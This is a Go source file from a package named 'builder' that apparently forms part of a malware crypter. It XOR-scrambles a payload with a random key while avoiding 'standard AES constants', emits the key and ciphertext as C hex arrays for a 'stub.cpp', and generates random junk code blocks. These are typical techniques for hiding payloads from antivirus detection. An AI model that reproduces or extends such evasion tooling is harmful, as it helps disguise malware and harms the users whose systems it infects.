package builder

import (
	"crypto/rand"
	"fmt"
	"math/big"
	"strings"
)

func randInt(max int) int {
    n, _ := rand.Int(rand.Reader, big.NewInt(int64(max)))
    return int(n.Int64())
}

func GenerateRandomKey(length int) []byte {
    key := make([]byte, length)
    rand.Read(key)
    return key
}

// EncryptPayload uses Custom Scrambler (No standard AES constants)
func EncryptPayload(data []byte) ([]byte, string) {
    keyLen := 32
    key := GenerateRandomKey(keyLen)
	encrypted := make([]byte, len(data))
    
    // Scrambler: Matches stub.cpp ScrambleData
	for i := 0; i < len(data); i++ {
        k := key[i % keyLen]
		encrypted[i] = data[i] ^ k ^ byte(i & 0xFF)
	}

	var sb strings.Builder
    sb.WriteString("{")
	for i, b := range key {
		if i > 0 { sb.WriteString(",") }
		sb.WriteString(fmt.Sprintf("0x%02X", b))
	}
    sb.WriteString("}")

	return encrypted, sb.String()
}

func BytesToHexString(data []byte) string {
	var sb strings.Builder
	for i, b := range data {
		if i > 0 { sb.WriteString(",") }
		if i%20 == 0 { sb.WriteString("\n") }
		sb.WriteString(fmt.Sprintf("0x%02X", b))
	}
	return sb.String()
}

func GenerateJunkBlock() string {
	return fmt.Sprintf("{\n    volatile int v = %d + %d;\n}", randInt(1000), randInt(1000))
}